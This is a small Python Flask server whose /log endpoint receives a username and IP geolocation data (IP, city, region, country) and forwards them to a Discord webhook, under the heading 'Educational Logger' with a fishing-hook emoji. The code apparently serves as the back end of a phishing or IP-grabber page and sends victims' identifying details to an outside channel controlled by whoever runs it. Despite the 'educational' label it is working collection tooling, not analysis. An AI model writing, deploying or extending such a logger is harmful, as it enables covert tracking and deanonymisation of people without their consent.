from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"

@app.route("/log", methods=["POST"])
def log():
    data = request.json
    username = data.get("username", "Unknown")
    ip_info = data.get("ipInfo", {})
    
    ip = ip_info.get("ip", "Unknown IP")
    city = ip_info.get("city", "Unknown City")
    region = ip_info.get("region", "Unknown Region")
    country = ip_info.get("country", "Unknown Country")
    
    content = (
        f"🎣 Educational Logger\n"
        f"👤 Username: **{username}**\n"
        f"🌐 IP: **{ip}**\n"
        f"📍 Location: **{city}, {region}, {country}**"
    )

    try:
        res = requests.post(WEBHOOK_URL, json={"content": content})
        res.raise_for_status()
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True)
